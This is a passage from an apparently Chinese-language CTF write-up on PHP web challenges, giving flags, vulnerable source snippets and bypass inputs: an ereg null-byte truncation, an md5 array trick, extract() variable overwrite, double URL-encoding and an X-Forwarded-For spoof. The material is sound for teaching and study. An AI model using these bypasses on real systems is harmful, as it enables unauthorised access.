</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>ORDER</span> <span style=color:#66d9ef>BY</span> <span style=color:#960050;background-color:#1e0010>{</span>col_name <span style=color:#f92672>|</span> expr <span style=color:#f92672>|</span> <span style=color:#66d9ef>position</span><span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span>      [<span style=color:#66d9ef>ASC</span> <span style=color:#f92672>|</span> <span style=color:#66d9ef>DESC</span>], ...]
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>LIMIT</span> <span style=color:#960050;background-color:#1e0010>{</span>[<span style=color:#66d9ef>offset</span>,] <span style=color:#66d9ef>row_count</span> <span style=color:#f92672>|</span> <span style=color:#66d9ef>row_count</span> <span style=color:#66d9ef>OFFSET</span> <span style=color:#66d9ef>offset</span><span style=color:#960050;background-color:#1e0010>}</span>]
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>PROCEDURE</span> procedure_name(argument_list)]
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>INTO</span> OUTFILE <span style=color:#e6db74>&#39;file_name&#39;</span>
</span></span><span style=display:flex><span>        [CHARACTER <span style=color:#66d9ef>SET</span> charset_name]
</span></span><span style=display:flex><span>        export_options
</span></span><span style=display:flex><span>      <span style=color:#f92672>|</span> <span style=color:#66d9ef>INTO</span> DUMPFILE <span style=color:#e6db74>&#39;file_name&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>|</span> <span style=color:#66d9ef>INTO</span> var_name [, var_name]]
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>FOR</span> <span style=color:#66d9ef>UPDATE</span> <span style=color:#f92672>|</span> <span style=color:#66d9ef>LOCK</span> <span style=color:#66d9ef>IN</span> <span style=color:#66d9ef>SHARE</span> <span style=color:#66d9ef>MODE</span>]]
</span></span></code></pre></td></tr></table></div></div><h4 id=x00httpteamxlcsinaappcomweb4f5a14f5e6e3453b78cd73899bad98d53indexphp><a href=http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php>/x00</a><a hidden class=anchor aria-hidden=true href=#x00httpteamxlcsinaappcomweb4f5a14f5e6e3453b78cd73899bad98d53indexphp>#</a></h4><p><em>nctf{use00to_jieduan}</em></p><p>访问得到源码</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span> ($_GET[<span style=color:#e6db74>&#39;nctf&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>@</span><span style=color:#a6e22e>ereg</span> (<span style=color:#e6db74>&#34;^[1-9]+$&#34;</span>, $_GET[<span style=color:#e6db74>&#39;nctf&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#66d9ef>FALSE</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;必须输入数字才行&#39;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strpos</span> ($_GET[<span style=color:#e6db74>&#39;nctf&#39;</span>], <span style=color:#e6db74>&#39;#biubiubiu&#39;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>FALSE</span>)   
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Flag: &#39;</span><span style=color:#f92672>.</span>$flag);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;骚年，继续努力吧啊~&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></td></tr></table></div></div><p>要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos找到<code>#biubiubiu</code> ，根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交<code>nctf=1%00%23biubiubiu</code>即可。</p><p><a href=https://github.com/VulnHub/ctf-writeups/blob/master/2015/boston-key-party/bringham-circle.md>参考资料</a></p><p>由于在PHP中<a href=http://php.net/manual/en/language.types.string.php#language.types.string.details>string</a>的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略"a NUL byte"后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子。闲着无聊<a href="https://www.google.com/search?q=%22not+binary+safe%22+or+%22not+binary-safe%22+site%3Aphp.net%2Fmanual%2Fen%2F">搜</a>了一下发现还有这么一些函数：</p><ul><li>int strcoll ( string $str1 , string $str2 )
Locale based string comparison (when current locale is not C or POSIX)</li><li>public array TokyoTyrantTable::get ( mixed $keys )
Gets a row from table database. (version>0.3.0)</li><li>public Exception::__construct ([ string $message = "" [, int $code = 0 [, Throwable $previous = NULL ]]] )
Construct the exception 。其中对message的处理是非二进制安全的。</li><li>public Error::__construct ([ string $message = "" [, int $code = 0 [, Throwable $previous = NULL ]]] )
Construct the error object 。其中对message的处理是非二进制安全的。</li><li>bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] )
Sends an error message to the web server&rsquo;s error log or to a file.。其中对message的处理是非二进制安全的。(error_log() is not binary safe. message will be truncated by null character.)</li><li>bool radius_put_string ( resource $radius_handle , int $type , string $value [, int $options = 0 [, int $tag ]] )
Attaches a string attribute。 其中$value值基于会被null截断的底层库，是非二进制安全的。</li><li>bool radius_put_vendor_string ( resource $radius_handle , int $vendor , int $type , string $value [, int $options = 0 [, int $tag ]] )
Attaches a vendor specific string attribute 。$value是非二进制安全的。</li><li>string addcslashes ( string $str , string $charlist ) （存疑，似乎并不是）
Quote string with slashes in a C style. Returns a string with backslashes before characters that are listed in charlist parameter.</li><li>array gzfile ( string $filename [, int $use_include_path = 0 ] ) （存疑，待验证）
Read entire gz-file into an array</li><li>还有这些</li></ul><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$s<span style=color:#f92672>=</span>$_REQUEST[<span style=color:#e6db74>&#39;a&#39;</span>]; <span style=color:#75715e>//   http://localhost/test.php?a=asd%00asdf
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$p<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;asdf&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>ereg_replace</span>($p,<span style=color:#e6db74>&#39;abcc&#39;</span>,$s)); <span style=color:#75715e>//string(3) &#34;asd&#34; 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>eregi_replace</span>($p,<span style=color:#e6db74>&#39;abcc&#39;</span>,$s));<span style=color:#75715e>//string(3) &#34;asd&#34; 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>ereg</span>($p,$s));<span style=color:#75715e>//bool(false) 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>eregi</span>($p,$s));<span style=color:#75715e>//bool(false) 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>split</span>($p,$s));<span style=color:#75715e>//array(1) { [0]=&gt; string(8) &#34;asd\0asdf&#34; } 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>split</span>($p,$s));<span style=color:#75715e>//array(1) { [0]=&gt; string(8) &#34;asd\0asdf&#34; } 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>sql_regcase</span>($s)); <span style=color:#75715e>//看起来没问题啊。。。string(29) &#34;[Aa][Ss][Dd]\0[Aa][Ss][Dd][Ff]&#34; 
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ereg_replace — Replace regular expression
</span></span></span><span style=display:flex><span><span style=color:#75715e>// ereg — Regular expression match
</span></span></span><span style=display:flex><span><span style=color:#75715e>// eregi_replace — Replace regular expression case insensitive
</span></span></span><span style=display:flex><span><span style=color:#75715e>// eregi — Case insensitive regular expression match
</span></span></span><span style=display:flex><span><span style=color:#75715e>// split — Split string into array by regular expression
</span></span></span><span style=display:flex><span><span style=color:#75715e>// spliti — Split string into array by regular expression case insensitive
</span></span></span><span style=display:flex><span><span style=color:#75715e>// sql_regcase — Make regular expression for case insensitive match
</span></span></span></code></pre></td></tr></table></div></div><h4 id=bypass-againhttpchinaloversinaappcomweb17indexphp><a href=http://chinalover.sinaapp.com/web17/index.php>bypass again</a><a hidden class=anchor aria-hidden=true href=#bypass-againhttpchinaloversinaappcomweb17indexphp>#</a></h4><p><em>nctf{php_is_so_cool}</em></p><p>访问得到源码</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-7>7</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;a&#39;</span>]) <span style=color:#66d9ef>and</span> <span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;b&#39;</span>])) {
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_GET[<span style=color:#e6db74>&#39;a&#39;</span>] <span style=color:#f92672>!=</span> $_GET[<span style=color:#e6db74>&#39;b&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>md5</span>($_GET[<span style=color:#e6db74>&#39;a&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($_GET[<span style=color:#e6db74>&#39;b&#39;</span>]))
</span></span><span style=display:flex><span><span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Flag: &#39;</span><span style=color:#f92672>.</span>$flag);
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#39;Wrong.&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即<code>var_dump(md5(array(2))===null);</code>值为<code>bool(true)</code> ，因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag，如访问 <em><a href="http://chinalover.sinaapp.com/web17/index.php?a%5B%5D=&amp;b%5B%5D=1">http://chinalover.sinaapp.com/web17/index.php?a[]=&amp;b[]=1</a></em></p><h4 id=变量覆盖httpchinaloversinaappcomweb18indexphp><a href=http://chinalover.sinaapp.com/web18/index.php>变量覆盖</a><a hidden class=anchor aria-hidden=true href=#变量覆盖httpchinaloversinaappcomweb18indexphp>#</a></h4><p><em>nctf{bian_liang_fu_gai!}</em></p><p>source.php核心代码如下</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ($_SERVER[<span style=color:#e6db74>&#34;REQUEST_METHOD&#34;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>) {
</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>extract</span>($_POST);
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> ($pass <span style=color:#f92672>==</span> $thepassword_123)
</span></span><span style=display:flex><span>                          <span style=color:#66d9ef>echo</span> $theflag;
</span></span><span style=display:flex><span>  }
</span></span></code></pre></td></tr></table></div></div><p>extract()函数原型为<code>int extract(array &$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]])</code> ，从数组中将变量导入当前符号表，<code>$extract_type</code>缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword_123即可。其实我们甚至可以覆盖theflag变量，但是那样就拿不到真正的flag了 :D。source.php包含源码。</p><h4 id=php是世界上最好的语言httpwaynuptzjcnphpindexphp><a href=http://way.nuptzj.cn/php/index.php>PHP是世界上最好的语言</a><a hidden class=anchor aria-hidden=true href=#php是世界上最好的语言httpwaynuptzjcnphpindexphp>#</a></h4><p><em>nctf{php_is_best_language}</em></p><p>index.txt核心代码如下</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>eregi</span>(<span style=color:#e6db74>&#34;hackerDJ&#34;</span>,$_GET[<span style=color:#a6e22e>id</span>])) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>echo</span>(<span style=color:#e6db74>&#34;&lt;p&gt;not allowed!&lt;/p&gt;&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$_GET[<span style=color:#a6e22e>id</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>urldecode</span>($_GET[<span style=color:#a6e22e>id</span>]);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_GET[<span style=color:#a6e22e>id</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;hackerDJ&#34;</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;Access granted!&lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;flag: *****************} &lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>网页会拒绝任何含有<code>hackerDJ</code>的提交(忽略大小写)，但接受urldecode后为<code>hackerDJ</code>的字符串，所以按照<a href=http://www.w3school.com.cn/tags/html_ref_urlencode.html>对照表</a>编码，并将<code>%</code>编码为<code>%25</code>后提交，自动解码一次后<code>%25</code>变为<code>%</code>,代码中再解码一次后便得到flag。即访问 <em><a href="http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a">http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a</a></em> 这是个二次编码的问题。</p><h4 id=伪装者>伪装者<a hidden class=anchor aria-hidden=true href=#伪装者>#</a></h4><blockquote><p>这是一个到处都有着伪装的世界
题目地址：<a href=http://chinalover.sinaapp.com/web4/xxx.php>点我</a></p></blockquote><p><em>nctf{happy_http_headers}</em></p><p>referer改了没用，据说请求头添加<code>X-Forwarded-For: 127.0.0.1</code>即可，没有成功，怀疑服务端代码有问题，可能是和<code>你从哪里来</code>那题一样的问题。XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务时。</p><h4 id=headerhttpwaynuptzjcnweb5><a href=http://way.nuptzj.cn/web5/>header</a><a hidden class=anchor aria-hidden=true href=#headerhttpwaynuptzjcnweb5>#</a></h4><p><em>nctf{tips_often_hide_here}</em></p><p>使用chrome浏览器的开发者工具可以看到相应数据包的头部有flag字段，其值即flag。</p><h4 id=上传绕过>上传绕过<a hidden class=anchor aria-hidden=true href=#上传绕过>#</a></h4><blockquote><p>题目地址：<a href=http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html>猜猜代码怎么写的</a></p></blockquote><p><em>nctf{welcome_to_hacks_world}</em></p><p>当filename为1.jpg时返回如下:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-5> 5</a>
